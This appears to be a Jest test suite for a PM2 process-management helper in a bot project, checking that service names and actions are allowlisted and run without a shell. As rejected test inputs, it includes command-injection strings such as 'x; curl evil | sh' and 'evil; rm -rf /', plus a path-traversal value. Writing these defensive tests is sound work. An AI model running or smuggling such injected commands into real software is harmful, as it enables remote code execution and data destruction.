/**
 * Tests for the safe PM2 service helper — allowlisting and no-shell execution.
 */

jest.mock('child_process', () => ({
  execFile: jest.fn(),
}));

const childProcess = require('child_process');
const pm2 = require('../../../src/utils/pm2-service');

// promisify(execFile) calls execFile(file, args, options, cb); make the mock
// invoke the callback so the promisified version resolves.
function mockExecFileSuccess(stdout = 'ok', stderr = '') {
  childProcess.execFile.mockImplementation((file, args, options, cb) => {
    cb(null, { stdout, stderr });
  });
}

beforeEach(() => {
  jest.clearAllMocks();
});

describe('resolvePm2AppName', () => {
  it('maps known service identifiers to the canonical app name', () => {
    expect(pm2.resolvePm2AppName('aszune-ai-bot')).toBe('aszune-ai');
    expect(pm2.resolvePm2AppName('aszune-ai')).toBe('aszune-ai');
    expect(pm2.resolvePm2AppName('aszune-bot')).toBe('aszune-ai');
  });

  it('rejects unknown or hostile service names', () => {
    expect(pm2.resolvePm2AppName('x; curl evil | sh')).toBeNull();
    expect(pm2.resolvePm2AppName('../../etc')).toBeNull();
    expect(pm2.resolvePm2AppName('')).toBeNull();
    expect(pm2.resolvePm2AppName(undefined)).toBeNull();
    expect(pm2.resolvePm2AppName({})).toBeNull();
  });
});

describe('runPm2ServiceAction', () => {
  it('runs pm2 with an argument array (no shell string)', async () => {
    mockExecFileSuccess('restarted');
    const out = await pm2.runPm2ServiceAction('aszune-ai-bot', 'restart');

    expect(childProcess.execFile).toHaveBeenCalledTimes(1);
    const [file, args] = childProcess.execFile.mock.calls[0];
    expect(file).toBe('pm2');
    expect(args).toEqual(['restart', 'aszune-ai']);
    expect(out).toBe('restarted');
  });

  it('throws on a disallowed service name and never execs', async () => {
    mockExecFileSuccess();
    await expect(pm2.runPm2ServiceAction('evil; rm -rf /', 'restart')).rejects.toThrow(
      /Unknown or disallowed service/
    );
    expect(childProcess.execFile).not.toHaveBeenCalled();
  });

  it('throws on an invalid action and never execs', async () => {
    mockExecFileSuccess();
    await expect(pm2.runPm2ServiceAction('aszune-ai', 'delete; ls')).rejects.toThrow(
      /Invalid action/
    );
    expect(childProcess.execFile).not.toHaveBeenCalled();
  });
});

describe('runPm2QuickAction', () => {
  it('maps groups to fixed argument arrays', async () => {
    mockExecFileSuccess();
    await pm2.runPm2QuickAction('restart-all');
    expect(childProcess.execFile.mock.calls[0][1]).toEqual(['restart', 'all']);
  });

  it('maps stop-non-essential to restart all (never stops the bot)', async () => {
    mockExecFileSuccess();
    await pm2.runPm2QuickAction('stop-non-essential');
    expect(childProcess.execFile.mock.calls[0][1]).toEqual(['restart', 'all']);
  });

  it('throws on an unknown group and never execs', async () => {
    mockExecFileSuccess();
    await expect(pm2.runPm2QuickAction('drop-tables')).rejects.toThrow(/Unknown quick action/);
    expect(childProcess.execFile).not.toHaveBeenCalled();
  });
});
